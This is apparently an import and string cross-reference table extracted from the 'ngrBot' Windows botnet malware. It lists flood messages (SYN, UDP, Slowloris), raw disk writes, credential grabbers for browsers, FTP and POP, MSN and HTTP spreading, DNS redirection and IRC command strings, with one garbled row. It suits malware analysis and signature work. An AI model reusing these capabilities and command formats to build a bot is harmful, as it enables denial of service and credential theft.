reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x1d874a	0x1e10a8	import	0x1d8670	KERNEL32.dll.LocalFree
0x1d88ae	0x1e1278	import	0x1d8790	Secur32.dll.InitializeSecurityContextW
0x1d89e0	0x1e1b18	string	0x1d89b0	Microsoft Unified Security Protocol Provider
0x1d8a32	0x1e1264	import	0x1d89b0	Secur32.dll.AcquireCredentialsHandleW
0x1d8a79	0x1e1278	import	0x1d89b0	Secur32.dll.InitializeSecurityContextW
0x1d8ac3	0x1e126c	import	0x1d89b0	Secur32.dll.QueryContextAttributesW
0x1d8b17	0x1e1270	import	0x1d89b0	Secur32.dll.DeleteSecurityContext
0x1d8b1e	0x1e1274	import	0x1d89b0	Secur32.dll.FreeCredentialsHandle
0x1d8fb5	0x1e1254	import	0x1d8f50	Secur32.dll.ApplyControlToken
0x1d9025	0x1e1270	import	0x1d8f50	Secur32.dll.DeleteSecurityContext
0x1d902f	0x1e1274	import	0x1d8f50	Secur32.dll.FreeCredentialsHandle
0x1d90a5	0x1e19ac	string	0x1d9080	firefox.exe
0x1d90be	0x1e1990	string	0x1d9080	iexplore.exe
0x1d90d8	0x1e1330	string	0x1d9080	pdef
0x1d9101	0x1e113c	import	0x1d9080	KERNEL32.dll.MultiByteToWideChar
0x1d9192	0x1e1b74	string	0x1d9080	%s.Blocked possible browser exploit pack call on URL '%s'
0x1d91f4	0x1e19ac	string	0x1d91f0	firefox.exe
0x1d920d	0x1e1990	string	0x1d91f0	iexplore.exe
0x1d9227	0x1e1330	string	0x1d91f0	pdef
0x1d92a8	0x1e1bc8	string	0x1d91f0	%s.Blocked possible browser exploit pack call on URL '%S'
0x1d9362	0x1e1174	import	0x1d9330	KERNEL32.dll.GetTickCount
0x1d938f	0x1e1188	import	0x1d9330	KERNEL32.dll.Sleep
0x1d9407	0x1e1174	import	0x1d9330	KERNEL32.dll.GetTickCount
0x1d9450	0x1e1174	import	0x1d9430	KERNEL32.dll.GetTickCount
0x1d9549	0x1e1188	import	0x1d9430	KERNEL32.dll.Sleep
0x1d9564	0x1e1174	import	0x1d9430	KERNEL32.dll.GetTickCount
0x1d95e0	0x1e1174	import	0x1d9580	KERNEL32.dll.GetTickCount
0x1d95fc	0x1e1120	import	0x1d9580	KERNEL32.dll.lstrcpyA
0x1d9602	0x1e29e0	string	0x1d9580	Mozilla/4.0
0x1d963c	0x1e29d8	string	0x1d9580	POST
0x1d964a	0x1e29d8	string	0x1d9580	POST
0x1d967f	0x1e2968	string	0x1d9580	%s / ?%d HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nKeep-Alive: 300\r\nConnection: keep-alive\r\nContent-Length: 42\r\n
0x1d970b	0x1e1180	import	0x1d96b0	KERNEL32.dll.HeapFree
0x1d9728	0x1e10a0	import	0x1d96b0	KERNEL32.dll.lstrcpynA
0x1d9751	0x1e1180	import	0x1d96b0	KERNEL32.dll.HeapFree
0x1d9770	0x1e1174	import	0x1d96b0	KERNEL32.dll.GetTickCount
0x1d97ba	0x1e5ee4	string	0x1d96b0	[SYN]: Starting flood on "%s:%d" for %d second(s)
0x1d97f0	0x1e5f18	string	0x1d96b0	[SYN]: Finished flood on "%s:%d"
0x1d981c	0x1e1180	import	0x1d96b0	KERNEL32.dll.HeapFree
0x1d988b	0x1e1180	import	0x1d9830	KERNEL32.dll.HeapFree
0x1d98a8	0x1e10a0	import	0x1d9830	KERNEL32.dll.lstrcpynA
0x1d98d1	0x1e1180	import	0x1d9830	KERNEL32.dll.HeapFree
0x1d98f0	0x1e1174	import	0x1d9830	KERNEL32.dll.GetTickCount
0x1d993a	0x1e5e8c	string	0x1d9830	[UDP]: Starting flood on "%s:%d" for %d second(s)
0x1d9970	0x1e5ec0	string	0x1d9830	[UDP]: Finished flood on "%s:%d"
0x1d999c	0x1e1180	import	0x1d9830	KERNEL32.dll.HeapFree
0x1d9a2d	0x1e1174	import	0x1d99b0	KERNEL32.dll.GetTickCount
0x1d9a60	0x1e1174	import	0x1d99b0	KERNEL32.dll.GetTickCount
0x1d9abe	0x1e1188	import	0x1d99b0	KERNEL32.dll.Sleep
0x1d9ae7	0x1e1120	import	0x1d99b0	KERNEL32.dll.lstrcpyA
0x1d9af0	0x1e2a08	string	0x1d99b0	X-a: b\r\n
0x1d9b00	0x1e29f0	string	0x1d99b0	Connection: Close\r\n\r\n
0x1d9b0f	0x1e1184	import	0x1d99b0	KERNEL32.dll.lstrlenA
0x1d9b51	0x1e1188	import	0x1d99b0	KERNEL32.dll.Sleep
0x1d9b5e	0x1e1184	import	0x1d99b0	KERNEL32.dll.lstrlenA
0x1d9b66	0x1e1174	import	0x1d99b0	KERNEL32.dll.GetTickCount
0x1d9b7f	0x1e1188	import	0x1d99b0	KERNEL32.dll.Sleep
0x1d9bd2	0x1e1174	import	0x1d99b0	KERNEL32.dll.GetTickCount
0x1d9be4	0x1e1184	import	0x1d99b0	KERNEL32.dll.lstrlenA
0x1d9c43	0x1e1174	import	0x1d99b0	KERNEL32.dll.GetTickCount
0x1d9c9a	0x1e1180	import	0x1d9c60	KERNEL32.dll.HeapFree
0x1d9cb3	0x1e1120	import	0x1d9c60	KERNEL32.dll.lstrcpyA
0x1d9cc4	0x1e10a0	import	0x1d9c60	KERNEL32.dll.lstrcpynA
0x1d9cf9	0x1e5e30	string	0x1d9c60	[Slowloris]: Starting flood on "%s" for %d minute(s)
0x1d9d45	0x1e5e68	string	0x1d9c60	[Slowloris]: Finished flood on "%s"
0x1d9d73	0x1e1180	import	0x1d9c60	KERNEL32.dll.HeapFree
0x1d9da7	0x1e1094	import	0x1d9d90	KERNEL32.dll.VirtualAlloc
0x1d9dd0	0x1e2a14	string	0x1d9d90	\\.\PHYSICALDRIVE0
0x1d9dd5	0x1e1110	import	0x1d9d90	KERNEL32.dll.CreateFileA
0x1d9e02	0x1e1098	import	0x1d9d90	KERNEL32.dll.DeviceIoControl
0x1d9e21	0x1e109c	import	0x1d9d90	KERNEL32.dll.SetFilePointer
0x1d9e2a	0x1e1164	import	0x1d9d90	KERNEL32.dll.WriteFile
0x1d9e56	0x1e109c	import	0x1d9d90	KERNEL32.dll.SetFilePointer
0x1d9ea2	0x1e1098	import	0x1d9d90	KERNEL32.dll.DeviceIoControl
0x1d9eec	0x1e2a28	string	0x1d9ec0	00100
0x1d9f09	0x1e2a14	string	0x1d9ec0	\\.\PHYSICALDRIVE0
0x1d9f16	0x1e1110	import	0x1d9ec0	KERNEL32.dll.CreateFileA
0x1d9f2b	0x1e1098	import	0x1d9ec0	KERNEL32.dll.DeviceIoControl
0x1d9f5a	0x1e1164	import	0x1d9ec0	KERNEL32.dll.WriteFile
0x1d9f77	0x1e1150	import	0x1d9ec0	KERNEL32.dll.CloseHandle
0x1da0a2	0x1e1158	import	0x1da080	KERNEL32.dll.CreateFileW
0x1da0c0	0x1e1164	import	0x1da080	KERNEL32.dll.WriteFile
0x1da0cb	0x1e1150	import	0x1da080	KERNEL32.dll.CloseHandle
0x1da0d8	0x1e1150	import	0x1da080	KERNEL32.dll.CloseHandle
0x1da184	0x1e10c8	import	0x1da150	KERNEL32.dll.GetWindowsDirectoryW
0x1da2ab	0x1e1090	import	0x1da260	KERNEL32.dll.CreateProcessW
0x1da2c5	0x1e1174	import	0x1da2c0	KERNEL32.dll.GetTickCount
0x1da39f	0x1e1184	import	0x1da310	KERNEL32.dll.lstrlenA
0x1da3a8	0x1e57a0	string	0x1da310	30e40.a1
0x1da3b0	0x1e57a0	string	0x1da310	30e40.a1
0x1da3bb	0x1e6904	string	0x1da310	\\.\pipe\%08x_ipc
0x1da3fd	0x1e57a0	string	0x1da310	30e40.a1
0x1da40e	0x1e57a0	string	0x1da310	30e40.a1
0x1da436	0x1e119c	import	0x1da310	KERNEL32.dll.EnterCriticalSection
0x1da452	0x1e1110	import	0x1da310	KERNEL32.dll.CreateFileA
0x1da464	0x1e1198	import	0x1da310	KERNEL32.dll.LeaveCriticalSection
0x1da484	0x1e1164	import	0x1da310	KERNEL32.dll.WriteFile
0x1da48b	0x1e1150	import	0x1da310	KERNEL32.dll.CloseHandle
0x1da496	0x1e1188	import	0x1da310	KERNEL32.dll.Sleep
0x1da4a1	0x1e1198	import	0x1da310	KERNEL32.dll.LeaveCriticalSection
0x1da557	0x1e2a48	string	0x1da550	NtShutdownSystem
0x1da55c	0x1e16e8	string	0x1da550	ntdll.dll
0x1da57a	0x1e1024	import	0x1da550	ADVAPI32.dll.OpenProcessToken
0x1da588	0x1e2a34	string	0x1da550	SeShutdownPrivilege
0x1da58f	0x1e1028	import	0x1da550	ADVAPI32.dll.LookupPrivilegeValueA
0x1da5b3	0x1e102c	import	0x1da550	ADVAPI32.dll.AdjustTokenPrivileges
0x1da5b9	0x1e116c	import	0x1da550	KERNEL32.dll.GetLastError
0x1da659	0x1e10cc	import	0x1da5d0	KERNEL32.dll.CreateThread
0x1da661	0x1e2ad4	string	0x1da5d0	ngrBot Error
0x1da666	0x1e2a60	string	0x1da5d0	This binary is invalid.\r\n\r\nMain reasons:\r\n- you stupid cracker\r\n- you stupid cracker...\r\n- you stupid cracker?!\r\n
0x1da66f	0x1e12a4	import	0x1da5d0	USER32.dll.MessageBoxA
0x1da678	0x1e10f8	import	0x1da5d0	KERNEL32.dll.WaitForSingleObject
0x1da680	0x1e108c	import	0x1da5d0	KERNEL32.dll.ExitProcess
0x1da6df	0x1e1238	import	0x1da690	SHELL32.dll.SHGetSpecialFolderPathW
0x1da6ed	0x1e1728	string	0x1da690	Internet Explorer\iexplore.exe
0x1da6f9	0x1e1240	import	0x1da690	SHLWAPI.dll.PathAppendW
0x1da70a	0x1e2af0	string	0x1da690	"%s" %S
0x1da77f	0x1e1090	import	0x1da690	KERNEL32.dll.CreateProcessW
0x1da7aa	0x1e1174	import	0x1da790	KERNEL32.dll.GetTickCount
0x1da7dc	0x1e1188	import	0x1da790	KERNEL32.dll.Sleep
0x1da819	0x1e1174	import	0x1da800	KERNEL32.dll.GetTickCount
0x1da859	0x1e1188	import	0x1da800	KERNEL32.dll.Sleep
0x1da8b1	0x1e1534	string	0x1da880	msnu
0x1da8bd	0x1e1330	string	0x1da880	pdef
0x1da8c9	0x1e1b04	string	0x1da880	ffgrab
0x1da8d5	0x1e1b0c	string	0x1da880	iegrab
0x1da8e1	0x1e1a9c	string	0x1da880	ftpgrab
0x1da8ed	0x1e1a68	string	0x1da880	popgrab
0x1da8fc	0x1e13e4	string	0x1da880	bdns
0x1da908	0x1e2b1c	string	0x1da880	usbi
0x1da914	0x1e2b14	string	0x1da880	httpi
0x1da946	0x1e2b04	string	0x1da880	http
0x1da956	0x1e2b04	string	0x1da880	http
0x1da970	0x1e2b30	string	0x1da970	DnsFlushResolverCache
0x1da975	0x1e2b24	string	0x1da970	dnsapi.dll
0x1da9ed	0x1e1090	import	0x1da990	KERNEL32.dll.CreateProcessW
0x1daa39	0x1e29e0	string	0x1daa10	Mozilla/4.0
0x1daa45	0x1e1120	import	0x1daa10	KERNEL32.dll.lstrcpyA
0x1daa60	0x1e12b8	import	0x1daa10	WININET.dll.InternetOpenA
0x1daa78	0x1e1184	import	0x1daa10	KERNEL32.dll.lstrlenA
0x1daa8c	0x1e12b4	import	0x1daa10	WININET.dll.InternetOpenUrlA
0x1daac0	0x1e12b0	import	0x1daa10	WININET.dll.HttpQueryInfoA
0x1daae2	0x1e12ac	import	0x1daa10	WININET.dll.InternetQueryDataAvailable
0x1dab00	0x1e12c8	import	0x1daa10	WININET.dll.InternetReadFile
0x1dabe7	0x1e12c4	import	0x1daa10	WININET.dll.InternetCloseHandle
0x1dac1a	0x1e1178	import	0x1dac00	KERNEL32.dll.HeapAlloc
0x1dac29	0x1e12bc	import	0x1dac00	WININET.dll.HttpQueryInfoW
0x1dac44	0x1e116c	import	0x1dac00	KERNEL32.dll.GetLastError
0x1dac5e	0x1e11a0	import	0x1dac00	KERNEL32.dll.HeapReAlloc
0x1dac80	0x1e2b48	string	0x1dac00	POST
0x1dac85	0x1e1134	import	0x1dac00	KERNEL32.dll.lstrcmpW
0x1dac99	0x1e1180	import	0x1dac00	KERNEL32.dll.HeapFree
0x1dacb2	0x1e1180	import	0x1dac00	KERNEL32.dll.HeapFree
0x1dad0a	0x1e1178	import	0x1dacd0	KERNEL32.dll.HeapAlloc
0x1dad1a	0x1e12c0	import	0x1dacd0	WININET.dll.InternetQueryOptionW
0x1dad31	0x1e116c	import	0x1dacd0	KERNEL32.dll.GetLastError
0x1dad4f	0x1e11a0	import	0x1dacd0	KERNEL32.dll.HeapReAlloc
0x1dad80	0x1e112c	import	0x1dacd0	KERNEL32.dll.WideCharToMultiByte
0x1dadb3	0x1e1120	import	0x1dacd0	KERNEL32.dll.lstrcpyA
0x1dade6	0x1e1180	import	0x1dacd0	KERNEL32.dll.HeapFree
0x1dae05	0x1e1184	import	0x1dae00	KERNEL32.dll.lstrlenA
0x1dae13	0x1e1178	import	0x1dae00	KERNEL32.dll.HeapAlloc
0x1dae69	0x1e1120	import	0x1dae00	KERNEL32.dll.lstrcpyA
0x1dae7f	0x1e1088	import	0x1dae00	KERNEL32.dll.lstrcatA
0x1daed5	0x1e1180	import	0x1dae00	KERNEL32.dll.HeapFree
0x1daeeb	0x1e1180	import	0x1dae00	KERNEL32.dll.HeapFree
0x1daf58	0x1e1120	import	0x1dae00	KERNEL32.dll.lstrcpyA
0x1daf70	0x1e1180	import	0x1dae00	KERNEL32.dll.HeapFree
0x1dafaf	0x1e1184	import	0x1dafa0	KERNEL32.dll.lstrlenA
0x1dafcb	0x1e1178	import	0x1dafa0	KERNEL32.dll.HeapAlloc
0x1db024	0x1e2b88	string	0x1dafa0	POST /%1023s
0x1db055	0x1e2b7c	string	0x1dafa0	Host:
0x1db08e	0x1e10a0	import	0x1dafa0	KERNEL32.dll.lstrcpynA
0x1db0d5	0x1e1178	import	0x1dafa0	KERNEL32.dll.HeapAlloc
0x1db0e3	0x1e2b74	string	0x1dafa0	HTTP
0x1db0ff	0x1e2b68	string	0x1dafa0	http://%s/
0x1db11e	0x1e2b58	string	0x1dafa0	http://%s/%s
0x1db13c	0x1e1180	import	0x1dafa0	KERNEL32.dll.HeapFree
0x1db16a	0x1e1184	import	0x1db160	KERNEL32.dll.lstrlenA
0x1db186	0x1e1178	import	0x1db160	KERNEL32.dll.HeapAlloc
0x1db199	0x1e2b98	string	0x1db160	\r\n\r\n
0x1db1d2	0x1e1178	import	0x1db160	KERNEL32.dll.HeapAlloc
0x1db1e5	0x1e10a0	import	0x1db160	KERNEL32.dll.lstrcpynA
0x1db1f8	0x1e1180	import	0x1db160	KERNEL32.dll.HeapFree
0x1db2ee	0x1db2b0	string	0x1db290	<%u2
0x1db312	0x1e117c	import	0x1db300	KERNEL32.dll.GetProcessHeap
0x1db319	0x1e1178	import	0x1db300	KERNEL32.dll.HeapAlloc
0x1db366	0x1e2bb4	string	0x1db300	lol.exe
0x1db387	0x1e10c8	import	0x1db300	KERNEL32.dll.GetWindowsDirectoryW
0x1db3a1	0x1e10b8	import	0x1db300	KERNEL32.dll.lstrcpynW
0x1db3bb	0x1e1084	import	0x1db300	KERNEL32.dll.GetVolumeInformationW
0x1db3cd	0x1e1184	import	0x1db300	KERNEL32.dll.lstrlenA
0x1db3d3	0x1e57a0	string	0x1db300	30e40.a1
0x1db3ea	0x1e57a0	string	0x1db300	30e40.a1
0x1db45b	0x1e2ba0	string	0x1db300	.exe
0x1db461	0x1e10bc	import	0x1db300	KERNEL32.dll.lstrcatW
0x1db4a9	0x1e2c18	string	0x1db480	isadmin
0x1db4ae	0x1e2c10	string	0x1db480	admin
0x1db4fe	0x1e1120	import	0x1db480	KERNEL32.dll.lstrcpyA
0x1db536	0x1e1178	import	0x1db480	KERNEL32.dll.HeapAlloc
0x1db550	0x1e10d8	import	0x1db480	KERNEL32.dll.GetVersionExA
0x1db60d	0x1e1178	import	0x1db480	KERNEL32.dll.HeapAlloc
0x1db620	0x1e68e8	string	0x1db480	http://api.wipmania.com/
0x1db63b	0x1e2be8	string	0x1db480	<br>
0x1db650	0x1e1184	import	0x1db480	KERNEL32.dll.lstrlenA
0x1db65f	0x1e1184	import	0x1db480	KERNEL32.dll.lstrlenA
0x1db67d	0x1e1080	import	0x1db480	KERNEL32.dll.GetLocaleInfoA
0x1db6a8	0x1e1128	import	0x1db480	KERNEL32.dll.lstrcmpA
0x1db6c5	0x1e1080	import	0x1db480	KERNEL32.dll.GetLocaleInfoA
0x1db6f9	0x1e1080	import	0x1db480	KERNEL32.dll.GetLocaleInfoA
0x1db741	0x1e1178	import	0x1db480	KERNEL32.dll.HeapAlloc
0x1db7f1	0x1e2bd0	string	0x1db480	n%s[%s{%s%s{%s
0x1db80b	0x1e2bc4	string	0x1db480	[%s{%s%s{%s
0x1db8be	0x1e2bd0	string	0x1db480	n%s[%s{%s%s{%s
0x1db8d5	0x1e2bc4	string	0x1db480	[%s{%s%s{%s
0x1db94b	0x1e2c20	string	0x1db900	127.0.0.1
0x1db975	0x1e1188	import	0x1db900	KERNEL32.dll.Sleep
0x1db9bc	0x1e119c	import	0x1db990	KERNEL32.dll.EnterCriticalSection
0x1db9d1	0x1e12a0	import	0x1db990	USER32.dll.wvsprintfA
0x1db9f2	0x1e1198	import	0x1db990	KERNEL32.dll.LeaveCriticalSection
0x1dba42	0x1e12a0	import	0x1dba00	USER32.dll.wvsprintfA
0x1dba56	0x1e5d4c	string	0x1dba00	PPPPMSG %s :%s\r\n
0x1dba7f	0x1e5c54	string	0x1dba70	PASS %s\r\n
0x1dba9c	0x1e5d24	string	0x1dba70	KCIK %s\r\n
0x1dbab4	0x1e5d10	string	0x1dba70	SSRR %s 0 0 :%s\r\n
0x1dbb52	0x1e1184	import	0x1dbb30	KERNEL32.dll.lstrlenA
0x1dbba0	0x1e1128	import	0x1dbb80	KERNEL32.dll.lstrcmpA
0x1dbbff	0x1e1128	import	0x1dbbb0	KERNEL32.dll.lstrcmpA
0x1dbc2c	0x1e57a0	string	0x1dbbb0	30e40.a1
0x1dbc36	0x1e5d88	string	0x1dbbb0	[v="%s" c="%s" h="%s" p="%S"]
0x1dbc89	0x1e2cf4	string	0x1dbbb0	reconnecting
0x1dbc8e	0x1e5d60	string	0x1dbbb0	QUIT :%s\r\n
0x1dbcc3	0x1e1184	import	0x1dbbb0	KERNEL32.dll.lstrlenA
0x1dbce1	0x1e1180	import	0x1dbbb0	KERNEL32.dll.HeapFree
0x1dbcec	0x1e2cf4	string	0x1dbbb0	reconnecting
0x1dbcf1	0x1e5d60	string	0x1dbbb0	QUIT :%s\r\n
0x1dbd28	0x1e2ce8	string	0x1dbbb0	exiting
0x1dbd2d	0x1e5d60	string	0x1dbbb0	QUIT :%s\r\n
0x1dbd5a	0x1e2cdc	string	0x1dbbb0	removing
0x1dbd5f	0x1e5d60	string	0x1dbbb0	QUIT :%s\r\n
0x1dbdb2	0x1e1120	import	0x1dbbb0	KERNEL32.dll.lstrcpyA
0x1dbdc6	0x1e1088	import	0x1dbbb0	KERNEL32.dll.lstrcatA
0x1dbdd5	0x1e5d30	string	0x1dbbb0	SEND %s %s\r\n
0x1dbe0c	0x1e2ccc	string	0x1dbbb0	#new
0x1dbe18	0x1e1120	import	0x1dbbb0	KERNEL32.dll.lstrcpyA
0x1dbe2a	0x1e5d30	string	0x1dbbb0	SEND %s %s\r\n
0x1dbe72	0x1e2cbc	string	0x1dbbb0	#admin
0x1dbe79	0x1e2cb4	string	0x1dbbb0	#user
0x1dbe7f	0x1e1120	import	0x1dbbb0	KERNEL32.dll.lstrcpyA
0x1dbe91	0x1e5d30	string	0x1dbbb0	SEND %s %s\r\n
0x1dbecb	0x1e1120	import	0x1dbbb0	KERNEL32.dll.lstrcpyA
0x1dbee7	0x1e1120	import	0x1dbbb0	KERNEL32.dll.lstrcpyA
0x1dbefa	0x1e1088	import	0x1dbbb0	KERNEL32.dll.lstrcatA
0x1dbf0c	0x1e5d30	string	0x1dbbb0	SEND %s %s\r\n
0x1dbf5f	0x1e1120	import	0x1dbbb0	KERNEL32.dll.lstrcpyA
0x1dbf73	0x1e1088	import	0x1dbbb0	KERNEL32.dll.lstrcatA
0x1dbf82	0x1e5d40	string	0x1dbbb0	PART %s\r\n
0x1dbfa6	0x1e2ccc	string	0x1dbbb0	#new
0x1dbfb2	0x1e1120	import	0x1dbbb0	KERNEL32.dll.lstrcpyA
0x1dbfc4	0x1e5d40	string	0x1dbbb0	PART %s\r\n
0x1dc00c	0x1e2cbc	string	0x1dbbb0	#admin
0x1dc013	0x1e2cb4	string	0x1dbbb0	#user
0x1dc019	0x1e1120	import	0x1dbbb0	KERNEL32.dll.lstrcpyA
0x1dc02b	0x1e5d40	string	0x1dbbb0	PART %s\r\n
0x1dc065	0x1e1120	import	0x1dbbb0	KERNEL32.dll.lstrcpyA
0x1dc081	0x1e1120	import	0x1dbbb0	KERNEL32.dll.lstrcpyA
0x1dc094	0x1e1088	import	0x1dbbb0	KERNEL32.dll.lstrcatA
0x1dc0a6	0x1e5d40	string	0x1dbbb0	PART %s\r\n
0x1dc0c3	0x1e5874	string	0x1dbbb0	stop
0x1dc0e3	0x1e5840	string	0x1dbbb0	stats
0x1dc124	0x1e6054	string	0x1dbbb0	[usb="%d" msn="%d" http="%d" total="%d"]
0x1dc156	0x1e6080	string	0x1dbbb0	[ftp="%d" pop="%d" http="%d" total="%d"]
0x1dc192	0x1e6054	string	0x1dbbb0	[usb="%d" msn="%d" http="%d" total="%d"]
0x1dc1b9	0x1e6080	string	0x1dbbb0	[ftp="%d" pop="%d" http="%d" total="%d"]
0x1dc1d2	0x1e5850	string	0x1dbbb0	logins
0x1dc225	0x1e1180	import	0x1dbbb0	KERNEL32.dll.HeapFree
0x1dc25e	0x1e2c88	string	0x1dbbb0	[Logins]: Cleared %d logins
0x1dc283	0x1e2c80	string	0x1dbbb0	%s|%s
0x1dc2c2	0x1e1184	import	0x1dbbb0	KERNEL32.dll.lstrlenA
0x1dc2d2	0x1e1178	import	0x1dbbb0	KERNEL32.dll.HeapAlloc
0x1dc2ea	0x1e1120	import	0x1dbbb0	KERNEL32.dll.lstrcpyA
0x1dc321	0x1e60d0	string	0x1dbbb0	[RSOCK4]: Stopped rsock4
0x1dc33f	0x1e5848	string	0x1dbbb0	speed
0x1dc354	0x1e1120	import	0x1dbbb0	KERNEL32.dll.lstrcpyA
0x1dc3fd	0x1e57f0	string	0x1dbbb0	jps獵 blocks=Basic Latin,CJK Unified Ideographs
0x1dc449	0x1e5d30	string	0x1dbbb0	SEND %s %s\r\n
0x1dc4bf	0x1e5d30	string	0x1dbbb0	SEND %s %s\r\n
0x1dc550	0x1e5d40	string	0x1dbbb0	PART %s\r\n
0x1dc572	0x1e5d40	string	0x1dbbb0	PART %s\r\n
0x1dc5d0	0x1e1330	string	0x1dbbb0	pdef
0x1dc5e2	0x1e1184	import	0x1dbbb0	KERNEL32.dll.lstrlenA
0x1dc5f7	0x1e1178	import	0x1dbbb0	KERNEL32.dll.HeapAlloc
0x1dc60e	0x1e1120	import	0x1dbbb0	KERNEL32.dll.lstrcpyA
0x1dc61f	0x1e1184	import	0x1dbbb0	KERNEL32.dll.lstrlenA
0x1dc633	0x1e1088	import	0x1dbbb0	KERNEL32.dll.lstrcatA
0x1dc642	0x1e1088	import	0x1dbbb0	KERNEL32.dll.lstrcatA
0x1dc679	0x1e1330	string	0x1dbbb0	pdef
0x1dc68f	0x1e1120	import	0x1dbbb0	KERNEL32.dll.lstrcpyA
0x1dc6d0	0x1e1120	import	0x1dbbb0	KERNEL32.dll.lstrcpyA
0x1dc6e0	0x1e1184	import	0x1dbbb0	KERNEL32.dll.lstrlenA
0x1dc706	0x1e1088	import	0x1dbbb0	KERNEL32.dll.lstrcatA
0x1dc73d	0x1e1120	import	0x1dbbb0	KERNEL32.dll.lstrcpyA
0x1dc743	0x1e1184	import	0x1dbbb0	KERNEL32.dll.lstrlenA
0x1dc77e	0x1e14f8	string	0x1dbbb0	msnmsg
0x1dc7ce	0x1e5f50	string	0x1dbbb0	[MSN]: Updated MSN spread message to "%s"
0x1dc7e7	0x1e5808	string	0x1dbbb0	msn.int
0x1dc826	0x1e1500	string	0x1dbbb0	msnint
0x1dc859	0x1e1184	import	0x1dbbb0	KERNEL32.dll.lstrlenA
0x1dc876	0x1e5f7c	string	0x1dbbb0	[MSN]: Updated MSN spread interval to "%s"
0x1dc88f	0x1e5810	string	0x1dbbb0	http.set
0x1dc8b5	0x1e1120	import	0x1dbbb0	KERNEL32.dll.lstrcpyA
0x1dc8d0	0x1e1184	import	0x1dbbb0	KERNEL32.dll.lstrlenA
0x1dc8f5	0x1e1088	import	0x1dbbb0	KERNEL32.dll.lstrcatA
0x1dc92c	0x1e1120	import	0x1dbbb0	KERNEL32.dll.lstrcpyA
0x1dc955	0x1e2b04	string	0x1dbbb0	http
0x1dc972	0x1e5fa8	string	0x1dbbb0	[HTTP]: Updated HTTP spread message to "%s"
0x1dc97f	0x1e581c	string	0x1dbbb0	http.int
0x1dc9c0	0x1e2b04	string	0x1dbbb0	http
0x1dc9df	0x1e5ff8	string	0x1dbbb0	[HTTP]: Updated HTTP spread interval to "%s"
0x1dc9f8	0x1e5828	string	0x1dbbb0	http.inj
0x1dca16	0x1e2b14	string	0x1dbbb0	httpi
0x1dca26	0x1e2c70	string	0x1dbbb0	enabled
0x1dca2b	0x1e5fd4	string	0x1dbbb0	[HTTP]: Injected value is now %s.
0x1dca43	0x1e2b14	string	0x1dbbb0	httpi
0x1dca53	0x1e2c64	string	0x1dbbb0	disabled
0x1dca58	0x1e5fd4	string	0x1dbbb0	[HTTP]: Injected value is now %s.
0x1dca71	0x1e5838	string	0x1dbbb0	mdns
0x1dca9f	0x1e1184	import	0x1dbbb0	KERNEL32.dll.lstrlenA
0x1dcadd	0x1e1178	import	0x1dbbb0	KERNEL32.dll.HeapAlloc
0x1dcaf3	0x1e1120	import	0x1dbbb0	KERNEL32.dll.lstrcpyA
0x1dcb36	0x1e13e4	string	0x1dbbb0	bdns
0x1dcb56	0x1e2c44	string	0x1dbbb0	[DNS]: Redirecting "%s" to "%s"
0x1dcb76	0x1e13e4	string	0x1dbbb0	bdns
0x1dcb7b	0x1e13dc	string	0x1dbbb0	block
0x1dcb95	0x1e6040	string	0x1dbbb0	[DNS]: Blocked "%s"
0x1dcbf4	0x1e6028	string	0x1dbbb0	[Visit]: Visited "%s"
0x1dcc0a	0x1e627c	string	0x1dbbb0	[Visit]: Error visitng "%s"
0x1dcc3a	0x1e1184	import	0x1dbbb0	KERNEL32.dll.lstrlenA
0x1dcc8b	0x1e2c34	string	0x1dbbb0	%s[%s{%s
0x1dcca8	0x1e2c80	string	0x1dbbb0	%s|%s
0x1dccd4	0x1e1178	import	0x1dbbb0	KERNEL32.dll.HeapAlloc
0x1dcce4	0x1e1120	import	0x1dbbb0	KERNEL32.dll.lstrcpyA
0x1dcd11	0x1e5860	string	0x1dbbb0	slow
0x1dcd27	0x1e2c80	string	0x1dbbb0	%s|%s
0x1dcd47	0x1e1184	import	0x1dbbb0	KERNEL32.dll.lstrlenA
0x1dcd58	0x1e1178	import	0x1dbbb0	KERNEL32.dll.HeapAlloc
0x1dcd70	0x1e1120	import	0x1dbbb0	KERNEL32.dll.lstrcpyA
0x1dcdfc	0x1e1534	string	0x1dbbb0	msnu
0x1dce55	0x1e1330	string	0x1dbbb0	pdef
0x1dce66	0x1e1b04	string	0x1dbbb0	ffgrab
0x1dce7b	0x1e1b0c	string	0x1dbbb0	iegrab
0x1dce8c	0x1e1a9c	string	0x1dbbb0	ftpgrab
0x1dce9d	0x1e1a68	string	0x1dbbb0	popgrab
0x1dceb2	0x1e13e4	string	0x1dbbb0	bdns
